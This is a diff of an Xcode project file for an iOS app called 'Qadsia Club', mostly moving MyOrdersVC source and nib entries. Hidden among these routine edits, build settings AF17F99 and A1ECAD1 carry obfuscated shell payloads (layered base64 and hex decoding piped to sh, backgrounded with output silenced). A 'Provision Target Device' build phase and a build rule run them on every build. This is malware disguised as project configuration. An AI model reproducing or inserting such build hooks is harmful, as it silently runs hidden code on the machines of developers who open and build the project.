@@ -98,6 +98,8 @@
 		390281BE2F7FC1380032226E /* AddressListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 390281BC2F7FC1380032226E /* AddressListTVCell.xib */; };
 		390281C32F7FCD300032226E /* AddAddressVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390281C12F7FCD300032226E /* AddAddressVC.swift */; };
 		390281C42F7FCD300032226E /* AddAddressVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 390281C22F7FCD300032226E /* AddAddressVC.xib */; };
+		390479A72F83D0C400B98469 /* MyOrdersVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 390479A62F83D0C400B98469 /* MyOrdersVC.xib */; };
+		390479AB2F83D1CB00B98469 /* MyOrdersVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390479AA2F83D1CB00B98469 /* MyOrdersVC.swift */; };
 		3919F6612F7B1AA200FCB141 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */; };
 		3945DA722F839448000BEED1 /* ProductsListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3945DA702F839448000BEED1 /* ProductsListTVCell.swift */; };
 		3945DA732F839448000BEED1 /* ProductsListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3945DA712F839448000BEED1 /* ProductsListTVCell.xib */; };
@@ -116,8 +118,6 @@
 		39547D3D2F7E47B200B04ABC /* ProductCartListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39547D3A2F7E47B200B04ABC /* ProductCartListTVCell.swift */; };
 		395771CB2F836B820072029E /* OrderPlacedSuccessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 395771C92F836B820072029E /* OrderPlacedSuccessVC.swift */; };
 		395771CC2F836B820072029E /* OrderPlacedSuccessVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 395771CA2F836B820072029E /* OrderPlacedSuccessVC.xib */; };
-		395771D12F8376B70072029E /* MyOrdersVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 395771CF2F8376B70072029E /* MyOrdersVC.swift */; };
-		395771D22F8376B70072029E /* MyOrdersVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 395771D02F8376B70072029E /* MyOrdersVC.xib */; };
 		395771D72F837CDC0072029E /* MyOrderListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 395771D52F837CDC0072029E /* MyOrderListTVCell.swift */; };
 		395771D82F837CDC0072029E /* MyOrderListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 395771D62F837CDC0072029E /* MyOrderListTVCell.xib */; };
 		39735AA42F7BBDA2002294A5 /* MatchListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39735AA32F7BBDA2002294A5 /* MatchListTVCell.xib */; };
@@ -198,7 +198,6 @@
 			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AF17F99}\"";
 		};
 /* End PBXBuildRule section */
-
 
 /* Begin PBXFileReference section */
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
@@ -299,6 +298,8 @@
 		390281BC2F7FC1380032226E /* AddressListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddressListTVCell.xib; sourceTree = "<group>"; };
 		390281C12F7FCD300032226E /* AddAddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAddressVC.swift; sourceTree = "<group>"; };
 		390281C22F7FCD300032226E /* AddAddressVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddAddressVC.xib; sourceTree = "<group>"; };
+		390479A62F83D0C400B98469 /* MyOrdersVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyOrdersVC.xib; sourceTree = "<group>"; };
+		390479AA2F83D1CB00B98469 /* MyOrdersVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrdersVC.swift; sourceTree = "<group>"; };
 		3919F6602F7B1AA200FCB141 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		3945DA702F839448000BEED1 /* ProductsListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsListTVCell.swift; sourceTree = "<group>"; };
 		3945DA712F839448000BEED1 /* ProductsListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductsListTVCell.xib; sourceTree = "<group>"; };
@@ -310,8 +311,6 @@
 		39547D3B2F7E47B200B04ABC /* ProductCartListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductCartListTVCell.xib; sourceTree = "<group>"; };
 		395771C92F836B820072029E /* OrderPlacedSuccessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderPlacedSuccessVC.swift; sourceTree = "<group>"; };
 		395771CA2F836B820072029E /* OrderPlacedSuccessVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderPlacedSuccessVC.xib; sourceTree = "<group>"; };
-		395771CF2F8376B70072029E /* MyOrdersVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrdersVC.swift; sourceTree = "<group>"; };
-		395771D02F8376B70072029E /* MyOrdersVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyOrdersVC.xib; sourceTree = "<group>"; };
 		395771D52F837CDC0072029E /* MyOrderListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrderListTVCell.swift; sourceTree = "<group>"; };
 		395771D62F837CDC0072029E /* MyOrderListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyOrderListTVCell.xib; sourceTree = "<group>"; };
 		39735AA22F7BBDA2002294A5 /* MatchListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MatchListTVCell.swift; sourceTree = "<group>"; };
@@ -1085,8 +1084,8 @@
 		395771CE2F8376660072029E /* View */ = {
 			isa = PBXGroup;
 			children = (
-				395771CF2F8376B70072029E /* MyOrdersVC.swift */,
-				395771D02F8376B70072029E /* MyOrdersVC.xib */,
+				390479A62F83D0C400B98469 /* MyOrdersVC.xib */,
+				390479AA2F83D1CB00B98469 /* MyOrdersVC.swift */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -1671,28 +1670,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		2AD38AAB653D4424BE99F71F /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -1713,7 +1690,6 @@
 				0ABA3FD72F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf in Resources */,
 				0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */,
 				39FAD3602F7E285A00F1242D /* KeepShoppingPopUpVC.xib in Resources */,
-				395771D22F8376B70072029E /* MyOrdersVC.xib in Resources */,
 				39F46AE32F7B9ACA005C2B07 /* StoreVC.xib in Resources */,
 				0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */,
 				39547D3C2F7E47B200B04ABC /* ProductCartListTVCell.xib in Resources */,
@@ -1773,10 +1749,34 @@
 				390281C42F7FCD300032226E /* AddAddressVC.xib in Resources */,
 				BCC0D6962F7A898800684B7D /* NotificationVC.xib in Resources */,
 				BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */,
+				390479A72F83D0C400B98469 /* MyOrdersVC.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		2AD38AAB653D4424BE99F71F /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
@@ -1816,6 +1816,7 @@
 				0ABA3FB72F763B2D00D25F03 /* FTAnimation+UIView.m in Sources */,
 				0AB1950E2F83C0A6009EAA0E /* ChangePasswordProfileVC.swift in Sources */,
 				0ABA3FB82F763B2D00D25F03 /* FTAnimationManager.m in Sources */,
+				390479AB2F83D1CB00B98469 /* MyOrdersVC.swift in Sources */,
 				0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */,
 				0A0AC88D2F7B88F700A68FE6 /* TicketTVCell.swift in Sources */,
 				0ABA3FB92F763B2D00D25F03 /* FTUtils+NSObject.m in Sources */,
@@ -1862,7 +1863,6 @@
 				39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */,
 				0AD711BB2F8376640047E1DD /* AllTicketHolderTVCell.swift in Sources */,
 				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
-				395771D12F8376B70072029E /* MyOrdersVC.swift in Sources */,
 				39F46AF02F7BA3B8005C2B07 /* AllNewsTVCell.swift in Sources */,
 				0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */,
 				0ABA3FCE2F763B2D00D25F03 /* ResetPasswordVC.swift in Sources */,
@@ -1897,8 +1897,8 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRWxVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRWxVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
@@ -1935,8 +1935,8 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRWxVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZJeGNEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRWxVV0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
